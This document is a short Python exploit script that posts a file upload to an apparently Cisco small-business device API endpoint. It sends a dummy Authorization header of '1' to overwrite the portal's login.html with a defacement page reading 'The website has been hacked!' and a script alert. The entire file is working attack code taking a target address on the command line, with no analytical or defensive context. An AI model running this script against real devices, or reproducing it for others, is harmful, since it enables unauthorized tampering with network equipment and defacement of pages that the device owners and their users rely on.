#!/usr/bin/env python3

def exploit(addr, https):
    import requests
    url = f"http{'s' if https else ''}://{addr}/api/operations/ciscosb-file:form-file-upload"
    files = {
        "pathparam": "Portal",
        "fileparam": "login.html",
        "file.path": "login.html",
        "file": ("login.html", "<title>The website has been hacked!</title><script>alert('The website has been hacked')</script>", "application/octet-stream")
    }
    resp = requests.post(url, headers={"Authorization":"1"}, files=files)
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("addr")
    parser.add_argument("--https", action='store_true')
    args = parser.parse_args()
    exploit(args.addr, args.https)
